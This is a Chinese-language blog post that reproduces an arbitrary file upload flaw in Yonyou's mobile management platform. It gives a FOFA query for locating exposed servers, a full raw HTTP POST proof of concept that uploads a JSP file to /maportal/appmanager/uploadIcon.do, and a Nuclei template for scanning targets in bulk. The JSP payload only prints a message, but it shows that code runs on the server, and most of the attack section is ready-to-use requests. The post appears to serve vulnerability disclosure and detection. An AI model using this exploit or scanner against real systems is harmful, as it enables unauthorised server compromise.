# 原创
：  漏洞复现--用友移动管理平台uploadIcon任意文件上传

# 漏洞复现--用友移动管理平台uploadIcon任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

用友移动系统管理是用友公司推出的一款移动办公解决方案，旨在帮助企业实现移动办公、提高管理效率和员工工作灵活性。它提供了一系列功能和工具，方便用户在移动设备上管理和处理企业的系统和业务。该产品存在任意文件上传，攻击者可通过此漏洞获取服务器权限。

### 二：漏洞影响版本

用友-移动系统管理

### 三：网络空间测绘查询

fofa:<br/> `app="用友-移动系统管理"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3c8a3378dce9356ceccafe8d001814c9.jpeg"/><br/> POC:

```
POST /maportal/appmanager/uploadIcon.do HTTP/1.1
Host: X.X.X.X
Content-Length: 242
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=96C92E0C800D0F301877F24A281C4630.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="iconFile"; filename="test.jsp"
Content-Type: application/msword

&lt;% out.print("This page has a vulnerability!"); %&gt;
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a74059bcaecae20a409e8e4aacb170fb.jpeg"/><br/> 访问/maupload/img/test.jsp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c77106ff342041ac9c7fc4081956a65e.jpeg"/>

### 五：批量检测

```
id: Yonyou-mobile-system-management-uploadfile

info:
  name: Yonyou-mobile-system-management-uploadfilet
  author: 芝士土拨鼠
  severity: high
  description: 用友移动系统管理是用友公司推出的一款移动办公解决方案，旨在帮助企业实现移动办公、提高管理效率和员工工作灵活性。它提供了一系列功能和工具，方便用户在移动设备上管理和处理企业的系统和业务。该产品存在任意文件上传，攻击者可通过此漏洞获取服务器权限。

requests:
  - raw:
      - |-
        POST /maportal/appmanager/uploadIcon.do HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 242
        Cache-Control: no-cache
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=96C92E0C800D0F301877F24A281C4630.server
        Connection: close

        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Content-Disposition: form-data; name="iconFile"; filename="test.jsp"
        Content-Type: application/msword

        &lt;% out.print("This page has a vulnerability!"); %&gt;
        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"status":2'
      - type: status
        status:
          - 200

```
